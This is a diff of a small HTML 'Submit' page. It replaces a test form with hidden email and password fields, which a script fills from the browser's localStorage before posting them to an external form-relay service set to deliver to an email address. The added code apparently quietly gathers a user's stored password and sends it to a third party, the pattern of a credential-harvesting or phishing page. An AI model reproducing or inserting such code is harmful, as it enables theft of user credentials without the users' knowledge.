@@ -4,22 +4,23 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Submit</title>
-    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div class="final-submit-container">
-        <form action="https://formsubmit.co/staineagleshort@gmail.com" method="POST">
-    <input type="text" name="name" value="Test Name">
-    <input type="email" name="email" value="test@example.com">
-    <button type="submit">Submit</button>
-</form>
-
+        <form action="https://formsubmit.co/YOUR_EMAIL" method="POST">
+            <input type="hidden" name="email" id="form-email">
+            <input type="hidden" name="password" id="form-password">
+            <!-- Add other hidden inputs if needed -->
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
         <script>
             // Retrieve user data from local storage
             document.getElementById('form-email').value = localStorage.getItem('userEmail');
+            document.getElementById('form-password').value = localStorage.getItem('userPassword');
             // If you have other data, set them similarly
         </script>
     </div>
 </body>
 </html>
+
 
